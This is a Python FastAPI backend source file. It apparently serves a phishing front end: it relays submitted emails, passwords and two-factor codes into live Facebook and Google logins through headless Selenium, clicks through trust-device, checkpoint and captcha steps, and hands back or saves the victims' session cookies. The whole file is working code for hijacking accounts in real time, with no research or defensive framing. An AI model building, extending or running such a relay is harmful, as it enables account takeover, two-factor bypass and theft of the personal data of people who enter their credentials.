import os
from fastapi import FastAPI, Form
from fastapi.middleware.cors import CORSMiddleware
import uvicorn
import time
from typing import Dict, Any

# Selenium helpers used in multiple endpoints
from selenium.webdriver.common.by import By

# we reference GoogleSeleniumManager in type hints and for convenience
from automation.google_automation import GoogleSeleniumManager

# session manager to keep browser instances between requests
from automation.session_manager import SessionManager

# global session store
_session_mgr = SessionManager()


# generic javascript used to click cookie-related buttons
cookie_js = """
var terms=['cookie'];
var actions=['accept','agree','allow','continue','ok','yes','got it','enable'];
Array.from(document.querySelectorAll('button, a, div, span')).forEach(el=>{
  var txt=(el.innerText||el.textContent||'').toLowerCase().trim();
  if(terms.some(t=>txt.includes(t)) && actions.some(a=>txt.includes(a))){
     try{el.click();}catch(e){}
  }
});
"""

# helper: take a screenshot and return base64 string
import base64
import os

def take_screenshot(driver, session_id: str, step_name: str) -> str:
    try:
        folder = 'screenshots'
        os.makedirs(folder, exist_ok=True)
        filename = os.path.join(folder, f"{session_id}_{step_name}_{int(time.time())}.png")
        driver.save_screenshot(filename)
        with open(filename, 'rb') as f:
            return base64.b64encode(f.read()).decode('ascii')
    except Exception:
        return ''


def destroy_all_cookie_popups(driver) -> bool:
    """Brutally remove or click any cookie consent dialog on the page.

    Will try every selector/text method repeatedly for up to 10 seconds.
    Returns True if it believes it found and removed something.
    """
    from selenium.webdriver.common.by import By
    start = time.time()
    found = False
    # characters to ignore case
    texts = [
        'allow','accept','ok','got it','continue','i agree',
        'accept all','allow all','accept cookies','allow cookies'
    ]
    # selectors for known classes/ids (can add more as needed)
    selectors = [
        '[id*=cookie]','[class*=cookie]','[role="dialog"]',
        '.cookie-banner','.cookie-consent','.cc-banner','.cc-window'
    ]
    while time.time() - start < 10:
        try:
            # try clicking by text using XPath
            for txt in texts:
                try:
                    btn = driver.find_element(
                        By.XPATH,
                        f"//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'{txt}')]")
                    btn.click()
                    found = True
                except Exception:
                    pass
            # try generic selectors
            for sel in selectors:
                try:
                    elems = driver.find_elements(By.CSS_SELECTOR, sel)
                    for el in elems:
                        try:
                            el.click()
                            found = True
                        except Exception:
                            # remove if not clickable
                            driver.execute_script("arguments[0].remove();", el)
                            found = True
                except Exception:
                    pass
            # js brute force: click any element containing cookie words
            js_click = """
Array.from(document.querySelectorAll('*')).forEach(el=>{
  var txt=(el.innerText||el.textContent||'').toLowerCase();
  if(txt.includes('cookie')){
    try{el.click();}catch(e){}
  }
});
"""
            driver.execute_script(js_click)
            # js remove any element with cookie in class or id
            js_rm = """
Array.from(document.querySelectorAll('[id*=cookie],[class*=cookie]')).forEach(el=>el.remove());
"""
            driver.execute_script(js_rm)
        except Exception:
            pass
        if found:
            # take a snapshot after successful attempt
            try:
                driver.save_screenshot('cookie_destroyed.png')
            except Exception:
                pass
            return True
        time.sleep(0.5)
    return False


def detect_facebook_page(driver) -> str:
    """Inspect driver state and return a page type string."""
    try:
        url = (driver.current_url or '').lower()
        src = (driver.page_source or '').lower()
    except Exception:
        return 'unknown'

    # cookie consent popup anywhere
    if 'allow the use of cookies' in src or 'cookie_consent' in src or 'allow all cookies' in src:
        return 'cookie_consent'
    # captcha
    if 'recaptcha' in src or 'g-recaptcha' in src or 'i am not a robot' in src:
        return 'captcha'
    # two-factor code entry
    if 'two_step_verification' in url or 'approvals_code' in src or 'enter the 6-digit code' in src:
        return '2fa'
    # trust device / save browser
    if 'save this browser' in src or 'this was me' in src or 'trusted device' in src:
        return 'trust_device'
    # checkpoint friend photos
    if 'identify photos of your friends' in src or 'click the photos of' in src:
        return 'checkpoint_friends'
    # checkpoint id upload
    if 'upload a photo of your id' in src or 'photo of your id' in src:
        return 'checkpoint_id'
    # phone verification
    if 'verify your phone' in src or 'enter the code from your mobile' in src:
        return 'checkpoint_phone'
    # email verification
    if 'verify your email' in src or 'code we sent to your email' in src:
        return 'checkpoint_email'
    # success detection: logged in and not on login page or checkpoint paths
    if 'facebook.com' in url and 'login' not in url and 'two_step' not in url and 'checkpoint' not in url:
        return 'success'
    return 'unknown'


def detect_google_page(driver) -> str:
    """Simple heuristics for the Google sign-in flow."""
    try:
        url = (driver.current_url or '').lower()
        src = (driver.page_source or '').lower()
    except Exception:
        return 'unknown'

    # password entry step
    if 'signin/v2/challenge/pwd' in url or 'password' in src:
        return 'password'
    # various two-factor / verification code challenges
    if 'challenge/selection' in url or '2sv' in url or 'enter your code' in src or 'verify' in src:
        return '2fa'
    # the new phone prompt flow shows text about "open the Gmail app" or
    # "2-step verification" without a code field
    if 'open the gmail app' in src or '2-step verification' in src or 'tap yes' in src:
        return '2fa'
    # QR code path (e.g. authenticator setup)
    if 'qr' in src and 'scan' in src:
        return 'qr'
    # success when we're no longer on the signin domain
    if 'accounts.google.com/signin' not in url:
        return 'success'
    return 'unknown'

app = FastAPI()

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000"],
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.post("/api/submit")
async def handle_submit(
    email: str = Form(...),
    password: str = Form(...),
    step: str = Form("login")
):
    # existing endpoint left for compatibility
    print(f"Step: {step}, Email: {email}")
    if step == "login":
        return {"success": True, "next_step": "complete", "message": "ok"}
    elif step == "otp":
        return {"success": True, "next_step": "complete"}
    return {"success": False, "message": "Unknown step"}


# new Facebook login route that triggers selenium automation
@app.post("/api/facebook/login")
async def facebook_login(  # Added async
    email: str = Form(...),
    password: str = Form(...)
) -> Dict[str, Any]:  # Added return type
    print(f"facebook login attempt: {email}")
    
    # Import here to avoid circular imports
    from automation.browser_automation import BrowserAutomation
    
    # allow turning off headless for debugging via env var
    headless_flag = os.getenv('FB_HEADFUL', '0') != '1'
    bot = BrowserAutomation(headless=headless_flag)
    # create a session to hold this bot; we'll delete it later if not used
    session_id = _session_mgr.create_session({'bot': bot})
    print(f'created fb session {session_id}')
    
    # helper to save screenshot and read base64
    def snap(name: str):
        bot.save_screenshot(name)
        try:
            import base64
            with open(name, 'rb') as f:
                return base64.b64encode(f.read()).decode('ascii')
        except Exception:
            return None

    screenshots = []

    try:
        bot.start()
        bot.navigate('https://www.facebook.com/login')
        screenshots.append({'step': 'opened login page', 'data': snap('step_open.png')})
        
        # wait until the email input is present, facebook occasionally changes id/name
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC

        wait = WebDriverWait(bot.driver, 10)
        
        # dismiss cookie popup before interacting
        # first try the exact selector user provided (specific button inside the popup)
        try:
            btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,
                "body > div.x1n2onr6.x1vjfegm > div.x9f619.x1n2onr6.x1ja2u2z > div > div.x1uvtmcs.x4k7w5x.x1h91t0o.x1beo9mf.xaigb6o.x12ejxvf.x3igimt.xarpa2k.xedcshv.x1lytzrv.x1t2pt76.x7ja8zs.x1n2onr6.x1qrby5j.x1jfb8zj > div > div > div > div > div.x1exxf4d.x13fuv20.x178xt8z.x1l90r2v.xv54qhq.xf7dkkf > div > div:nth-child(2)"
            )))
            btn.click()
            time.sleep(1)
        except Exception:
            # fallback to heuristic script click
            cookie_js = """
var terms=['cookie'];
var actions=['accept','agree','allow','continue','ok','yes','got it','enable'];
Array.from(document.querySelectorAll('button, a, div, span')).forEach(el=>{
  var txt=(el.innerText||el.textContent||'').toLowerCase().trim();
  if(terms.some(t=>txt.includes(t)) && actions.some(a=>txt.includes(a))){
     try{el.click();}catch(e){}
  }
});
"""
            try:
                bot.driver.execute_script(cookie_js)
                time.sleep(1)
            except Exception:
                pass

        # also try the very specific selector the frontend user provided
        specific_sel = (
            "body > div.x1n2onr6.x1vjfegm > div.x9f619.x1n2onr6.x1ja2u2z > div > div.x1uvtmcs.x4k7w5x.x1h91t0o.x1beo9mf.xaigb6o.x12ejxvf.x3igimt.xarpa2k.xedcshv.x1lytzrv.x1t2pt76.x7ja8zs.x1n2onr6.x1qrby5j.x1jfb8zj > "
            "div > div > div > div > div.x1exxf4d.x13fuv20.x178xt8z.x1l90r2v.xv54qhq.xf7dkkf > div > div:nth-child(2)"
        )
        try:
            btn = bot.driver.find_element(By.CSS_SELECTOR, specific_sel)
            print('clicking specific provided selector for consent/banner')
            btn.click()
            time.sleep(1)
        except Exception as e:
            print('specific selector click failed', e)
        
        # try several selectors for email
        email_input = None
        for sel in [(By.ID, 'email'), (By.NAME, 'email'), (By.CSS_SELECTOR, 'input[type=email]')]:
            try:
                email_input = wait.until(EC.presence_of_element_located(sel))
                break
            except Exception:
                continue
        
        if email_input:
            email_input.send_keys(email)
            screenshots.append({'step': 'filled email', 'data': snap('step_email.png')})
        else:
            raise RuntimeError('email input not found')

        # password field
        passwd_input = None
        for sel in [(By.ID, 'pass'), (By.NAME, 'pass'), (By.CSS_SELECTOR, 'input[type=password]')]:
            try:
                passwd_input = wait.until(EC.presence_of_element_located(sel))
                break
            except Exception:
                continue
        
        if not passwd_input:
            raise RuntimeError('password input not found')
        
        # debug: record all button texts before consent
        try:
            buttons = bot.driver.find_elements(By.TAG_NAME, 'button')
            for i, b in enumerate(buttons):
                try:
                    print(f'pre-consent button[{i}] text="{b.text}"')
                except Exception:
                    pass
        except Exception:
            pass
        
        # sometimes a cookie consent dialog appears; try to dismiss it BEFORE entering credentials
        try:
            bot.driver.execute_script(cookie_js)
            time.sleep(1)
        except Exception:
            pass

        # now enter password
        passwd_input.send_keys(password)
        screenshots.append({'step': 'filled password', 'data': snap('step_password.png')})

        # login button - search and if not found, try removing potential overlays then search again
        def find_login_button():
            for sel in [
                (By.NAME, 'login'),
                (By.CSS_SELECTOR, 'button[type=submit]'),
                (By.XPATH, "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'log in')]")
            ]:
                try:
                    return wait.until(EC.element_to_be_clickable(sel))
                except Exception:
                    continue
            # try the explicit login-button selector user just provided
            user_login_sel = (
                "#login_form > div > div.x1n2onr6.x1ja2u2z.x9f619.x78zum5.xdt5ytf.x2lah0s.x193iq5w.xz9dl7a > "
                "div > div.x9f619.x1n2onr6.x1ja2u2z.x78zum5.xdt5ytf.x2lah0s.x193iq5w.x6s0dn4.xz9dl7a.x1k70j0n.xzueoph.xzboxd6.x14l7nz5 > div > div > div"
            )
            try:
                return wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, user_login_sel)))
            except Exception:
                pass
            # as a last resort try CSS path the user mentioned earlier (cookie button path)
            try:
                return wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, specific_sel)))
            except Exception:
                pass
            return None

        btn = find_login_button()
        result: Dict[str, Any] = {}  # Initialize result

        if not btn:
            # maybe a transparent overlay is blocking clicks; try removing common banner/dialog elements
            print('login button not found on first attempt, attempting to clear overlays')
            try:
                bot.driver.execute_script(
                    "document.querySelectorAll('[role=dialog],[role=banner],.cookie-banner,.cc-banner,.cookie-consent,.privacy-banner').forEach(e=>e.remove());"
                )
            except Exception:
                pass
            # take another screenshot for debugging
            bot.save_screenshot('after_overlay_removal.png')
            # print all available buttons again for debug
            try:
                buttons = bot.driver.find_elements(By.TAG_NAME, 'button')
                for i, b in enumerate(buttons):
                    try:
                        print(f'post-overlay button[{i}] text="{b.text}" class="{b.get_attribute("class")}"')
                    except Exception:
                        pass
            except Exception:
                pass
            btn = find_login_button()
            # if still no btn, try clicking with the exact css path provided by user
            if not btn:
                print('attempting css-path click fallback')
                try:
                    bot.driver.execute_script(
                        "var el=document.querySelector('body > div.x1n2onr6.x1vjfegm > div.x9f619.x1n2onr6.x1ja2u2z > div > div.x1uvtmcs.x4k7w5x.x1h91t0o.x1beo9mf.xaigb6o.x12ejxvf.x3igimt.xarpa2k.xedcshv.x1lytzrv.x1t2pt76.x7ja8zs.x1n2onr6.x1qrby5j.x1jfb8zj > div > div > div > div > div.x1exxf4d.x13fuv20.x178xt8z.x1l90r2v.xv54qhq.xf7dkkf > div > div:nth-child(2)'); if(el) el.click();"
                    )
                    time.sleep(1)
                except Exception as e:
                    print('css-path click fallback error', e)
                # try find button again after js click
                btn = find_login_button()

        if btn:
            btn.click()
            screenshots.append({'step': 'clicked login button', 'data': snap('step_clicked_login.png')})
            # immediately accept any "allow all cookies" popup once
            try:
                bot.driver.execute_script(cookie_js)
            except Exception:
                pass
            try:
                allbtn = bot.driver.find_element(By.XPATH,
                    "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'allow all')]")
                allbtn.click()
                screenshots.append({'step': 'immediate allow-all', 'data': snap('allow_all_immediate.png')})
            except Exception:
                pass
            # force-close cookie pop-up if detect shows it before main loop
            try:
                page_now = detect_facebook_page(bot.driver)
                if page_now == 'cookie_consent':
                    try:
                        btn2 = bot.driver.find_element(By.XPATH,
                            "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'allow all')]")
                        btn2.click()
                        screenshots.append({'step':'forced allow-all after login','data':snap('forced_cookie.png')})
                        time.sleep(1)
                    except Exception:
                        pass
            except Exception:
                pass
            # after submitting credentials, handle whatever page Facebook shows
            attempts = 0
            while attempts < 20:
                attempts += 1
                time.sleep(2)
                current_url = bot.driver.current_url
                # always clear cookies each iteration
                try:
                    bot.driver.execute_script(cookie_js)
                except Exception:
                    pass
                try:
                    btn_allow = bot.driver.find_element(By.XPATH,
                        "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'allow all')]")
                    btn_allow.click()
                except Exception:
                    pass
                page = detect_facebook_page(bot.driver)
                screenshots.append({'step': f'iteration {attempts} ({page})', 'data': snap(f'iter_{attempts}_{page}.png')})
                if page == 'success':
                    result = {"success": True, "page": page, "url": current_url}
                    return result
                if page in ['cookie_consent','captcha','2fa','trust_device',
                           'checkpoint_friends','checkpoint_id',
                           'checkpoint_phone','checkpoint_email']:
                    result = {"success": True, "page": page, "url": current_url,
                              "session_id": session_id}
                    return result
            # loop ended without detection
            result = {"success": False, "page": "unknown", "error": "no page after login"}
        else:
            print('login button still not found after overlay removal')
            # attempt form submission as last resort
            try:
                bot.driver.execute_script("document.getElementById('login_form').submit();")
                time.sleep(1)
                wait.until(EC.url_changes('https://www.facebook.com/login'))
                result = {"success": True, "url": bot.driver.current_url}
            except Exception as e:
                print('form submit fallback failed', e)
                result = {"success": False, "error": "Login button not found"}
            
    except Exception as e:
        print('selenium error', str(e))
        result = {"success": False, "error": str(e)}
    
    finally:
        # if two_factoring, keep the browser open inside session
        if not result.get('two_factor'):
            # not a 2fa flow – close browser and remove session
            try:
                result['cookies'] = bot.driver.get_cookies()
            except Exception as e:
                result['cookies'] = None
                print(f"Error getting cookies: {e}")
            
            try:
                bot.save_screenshot('fb_login_attempt.png')
            except Exception as e:
                print(f"Error saving screenshot: {e}")
            
            bot.close()
            _session_mgr.delete(session_id)
        else:
            # still record cookies for reference
            try:
                result['cookies'] = bot.driver.get_cookies()
            except Exception:
                result['cookies'] = None

    return result


@app.post("/api/facebook/cookie-consent")
async def facebook_cookie_consent(
    session_id: str = Form(...),
    action: str = Form("accept")
) -> Dict[str, Any]:
    """Click cookie consent button and return next page."""
    data = _session_mgr.get_session(session_id)
    if not data or 'bot' not in data:
        return {"success": False, "error": "invalid or expired session"}
    bot = data['bot']
    result: Dict[str, Any] = {"success": True}
    try:
        if action == 'accept':
            # attempt various selectors
            try:
                btn = bot.driver.find_element(By.XPATH,
                    "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'allow all')]")
                btn.click()
            except Exception:
                pass
            try:
                bot.driver.execute_script(cookie_js)
            except Exception:
                pass
        else:
            # decline optional cookies
            try:
                btn = bot.driver.find_element(By.XPATH,
                    "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'decline')]")
                btn.click()
            except Exception:
                pass
        time.sleep(2)
        page = detect_facebook_page(bot.driver)
        result['next_page'] = page
        result['screenshot'] = take_screenshot(bot.driver, session_id, 'cookie_consent')
        result['session_id'] = session_id
    except Exception as e:
        result = {"success": False, "error": str(e)}
    return result


@app.post("/api/facebook/2fa")
async def facebook_2fa(
    session_id: str = Form(...),
    code: str = Form(...)
) -> Dict[str, Any]:
    print(f"2fa submit for session {session_id}")
    data = _session_mgr.get_session(session_id)
    if not data or 'bot' not in data:
        return {"success": False, "error": "invalid or expired session"}
    bot = data['bot']
    result: Dict[str, Any] = {"success": False}
    try:
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        wait = WebDriverWait(bot.driver, 10)
        # locate the code input
        try:
            code_input = wait.until(EC.presence_of_element_located((By.NAME, 'approvals_code')))
        except Exception:
            code_input = wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, 'input[type=text]')))
        code_input.clear()
        code_input.send_keys(code)
        # click the continue button
        try:
            btn = bot.driver.find_element(By.NAME, 'checkpointSubmitButton')
        except Exception:
            btn = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'continue') or contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'submit')]")))
        btn.click()
        # wait for URL change or short delay
        try:
            wait.until(lambda d: 'two_step_verification' not in d.current_url)
        except Exception:
            pass
        time.sleep(1)
        page = detect_facebook_page(bot.driver)
        result = {"success": True, "next_page": page, "session_id": session_id}
        result['screenshot'] = take_screenshot(bot.driver, session_id, 'after_2fa')
        if page == 'success':
            result['cookies'] = bot.driver.get_cookies()
            bot.close()
            _session_mgr.delete(session_id)
    except Exception as e:
        print('2fa selenium error', e)
        result = {"success": False, "error": str(e)}
    return result


@app.post("/api/facebook/trust-device")
async def facebook_trust_device(
    session_id: str = Form(...),
    action: str = Form("trust")
) -> Dict[str, Any]:
    data = _session_mgr.get_session(session_id)
    if not data or 'bot' not in data:
        return {"success": False, "error": "invalid or expired session"}
    bot = data['bot']
    result: Dict[str, Any] = {"success": True}
    try:
        if action == 'trust':
            # try both common buttons
            for txt in ['this was me', 'save browser']:
                try:
                    btn = bot.driver.find_element(By.XPATH, f"//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'{txt}')]")
                    btn.click()
                    break
                except Exception:
                    pass
        else:
            for txt in ['this wasn\'t me', 'not now']:
                try:
                    btn = bot.driver.find_element(By.XPATH, f"//button[contains(translate(text(),'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz'),'{txt}')]")
                    btn.click()
                    break
                except Exception:
                    pass
        time.sleep(2)
        page = detect_facebook_page(bot.driver)
        result['next_page'] = page
        result['screenshot'] = take_screenshot(bot.driver, session_id, 'trust_device')
        result['session_id'] = session_id
    except Exception as e:
        result = {"success": False, "error": str(e)}
    return result


@app.post("/api/facebook/captcha")
async def facebook_captcha(
    session_id: str = Form(...),
    solved: bool = Form(False)
) -> Dict[str, Any]:
    data = _session_mgr.get_session(session_id)
    if not data or 'bot' not in data:
        return {"success": False, "error": "invalid or expired session"}
    bot = data['bot']
    result: Dict[str, Any] = {"success": True}
    # take screenshot
    result['screenshot'] = take_screenshot(bot.driver, session_id, 'captcha')
    if not solved:
        result['next_page'] = detect_facebook_page(bot.driver)
        result['session_id'] = session_id
        return result
    # solved == True
    time.sleep(3)
    page = detect_facebook_page(bot.driver)
    result['next_page'] = page
    result['session_id'] = session_id
    return result

# ---------------------- google endpoints ----------------------

@app.post("/api/google/login")
async def google_login(
    email: str = Form(...)
) -> Dict[str, Any]:
    """Start a Google flow by submitting the email address.

    For debugging we capture a series of screenshots and return them.
    """

    headless_flag = os.getenv('GOOGLE_HEADFUL', '0') != '1'
    manager = GoogleSeleniumManager(headless=headless_flag)
    session_id = _session_mgr.create_session({'manager': manager})
    # we still take screenshots for local debugging, but we don't ship them
    # back to the client.  the helper just writes files and returns the filename
    def snap(name: str) -> str:
        try:
            fn = f"{session_id}_{name}.png"
            manager.bot.save_screenshot(fn)
            return fn
        except Exception:
            return ''

    try:
        manager.start()
        manager.navigate_to_login()
        # immediately try to clear any cookie banner
        destroy_all_cookie_popups(manager.bot.driver)
        manager.enter_email(email)
        # take a snapshot after waiting for potential password field
        snap('after_email')
        time.sleep(2)
        page = detect_google_page(manager.bot.driver)
        return {"success": True, "page": page, "session_id": session_id}
    except Exception as e:
        try:
            manager.bot.close()
        except Exception:
            pass
        _session_mgr.delete(session_id)
        return {"success": False, "error": str(e)}


@app.post("/api/google/password")
async def google_password(
    session_id: str = Form(...),
    password: str = Form(...)
) -> Dict[str, Any]:
    data = _session_mgr.get_session(session_id)
    if not data or 'manager' not in data:
        return {"success": False, "error": "invalid or expired session"}
    manager: GoogleSeleniumManager = data['manager']
    screenshots = data.get('screenshots', [])

    def snap(name: str) -> str:
        try:
            fn = f"{session_id}_{name}.png"
            manager.bot.save_screenshot(fn)
            with open(fn, 'rb') as f:
                return base64.b64encode(f.read()).decode('ascii')
        except Exception:
            return ''

    try:
        manager.enter_password(password)
        snap('password')
        # after submitting password, Google may take some time to either
        # show a 2FA prompt or redirect to logged-in page.  Poll for a bit.
        page = detect_google_page(manager.bot.driver)
        timeout = 30
        # wait until we leave the password screen or hit 2fa
        while page == 'password' and timeout > 0:
            time.sleep(1)
            timeout -= 1
            page = detect_google_page(manager.bot.driver)
        # if still on password but page source indicates push instructions, treat as 2fa
        if page == 'password':
            src = manager.bot.driver.page_source.lower() or ''
            if 'open the gmail app' in src or 'notification to your' in src or 'tap yes' in src:
                page = '2fa'
        result = {"success": True, "page": page, "session_id": session_id}
        # always grab cookies (may be empty) so caller can inspect them
        cookies = manager.bot.driver.get_cookies()
        if cookies:
            result['cookies'] = cookies
        try:
            os.makedirs('cookies', exist_ok=True)
            fname = os.path.join('cookies', f"{session_id}_password.json")
            import json
            with open(fname, 'w') as f:
                json.dump(cookies, f, indent=2)
        except Exception:
            pass
        if page == 'success':
            # browser can be closed when done
            manager.bot.close()
            _session_mgr.delete(session_id)
        # if it ended up on 2fa (or unknown), we keep browser open for later
        return result
    except Exception as e:
        return {"success": False, "error": str(e)}


@app.post("/api/google/2fa")
async def google_2fa(
    session_id: str = Form(...),
    code: str = Form(...)
) -> Dict[str, Any]:
    data = _session_mgr.get_session(session_id)
    if not data or 'manager' not in data:
        return {"success": False, "error": "invalid or expired session"}
    manager: GoogleSeleniumManager = data['manager']
    # helper writes a file but we don't send its contents
    def snap(name: str) -> str:
        try:
            fn = f"{session_id}_{name}.png"
            manager.bot.save_screenshot(fn)
            return fn
        except Exception:
            return ''
    try:
        if code:
            manager.submit_2fa(code)
            snap('2fa')
        # regardless of whether we submitted, wait a moment for the page to update
        time.sleep(2)
        page = detect_google_page(manager.bot.driver)
        # if still not success and we didn't submit a code, poll a bit longer
        if not code and page in ('password','2fa'):
            timeout = 15
            while page not in ('success','unknown') and timeout > 0:
                time.sleep(1)
                timeout -= 1
                page = detect_google_page(manager.bot.driver)
        result = {"success": True, "page": page, "session_id": session_id}
        # attempt to capture a destination string (e.g. "code sent to ...")
        try:
            txt = manager.bot.driver.find_element(By.XPATH,
                "//*[contains(text(),'sent to') or contains(text(),'code')]").text
            result['destination'] = txt
        except Exception:
            pass
        if page == 'success':
            cookies = manager.bot.driver.get_cookies()
            result['cookies'] = cookies
            try:
                os.makedirs('cookies', exist_ok=True)
                fname = os.path.join('cookies', f"{session_id}_2fa.json")
                import json
                with open(fname, 'w') as f:
                    json.dump(cookies, f, indent=2)
            except Exception:
                pass
            manager.bot.close()
            _session_mgr.delete(session_id)
        return result
    except Exception as e:
        return {"success": False, "error": str(e)}


@app.post("/api/google/qr")
async def google_qr(
    session_id: str = Form(...)
) -> Dict[str, Any]:
    data = _session_mgr.get_session(session_id)
    if not data or 'manager' not in data:
        return {"success": False, "error": "invalid or expired session"}
    manager: "GoogleSeleniumManager" = data['manager']
    try:
        qr = manager.get_qr_code()
        return {"success": True, "qr_image": qr, "session_id": session_id}
    except Exception as e:
        return {"success": False, "error": str(e)}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)